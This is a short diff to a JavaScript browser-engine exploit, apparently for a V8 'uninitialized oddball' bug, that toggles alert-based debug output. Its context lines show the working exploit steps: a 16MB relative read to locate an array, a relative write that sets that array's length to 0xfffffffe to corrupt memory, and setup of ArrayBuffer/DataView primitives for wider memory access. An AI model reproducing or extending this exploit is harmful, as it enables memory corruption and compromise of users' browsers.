@@ -116,7 +116,7 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
 
     // Used to prevent optimizations
     let function_cache = {};
-    alert(typeof(uninitialized_oddball));
+    // alert(typeof(uninitialized_oddball));
     function read_builder(size) {
         let arr = new Array(size);
         arr[0] = 1.1;
@@ -253,7 +253,7 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
               }   
           }
         }catch(e){
-          alert(e);
+          // alert(e);
           location.hred = "exp.html"
           window.location.reload();
         }
@@ -351,7 +351,7 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
     // Search for `corrupted_array` in oldspace using 16MB relative read
     let [length_offset, position] = search_for_length();
     var old_length_value =  relative_read64(length_offset);
-    // alert(hex(old_length_value));
+    alert(hex(old_length_value));
     helpers.set_i64(old_length_value);
     if (position == 0) {
         helpers.set_l(0xfffffffe);
@@ -362,7 +362,7 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
     // Overwrite `corrupted_array`'s length with 0xfffffffe using 16MB 
     // relative write
     relative_write64(length_offset, helpers.get_i64());
-    // %DebugPrint(corrupted_array);
+    alert("corrupted_array new length :" + hex(corrupted_array.length));
     
     // Setup stable arraybuffers/dataviews using `corrupted_array`
     let ab_addr = caged_addrOf(caged_ab);
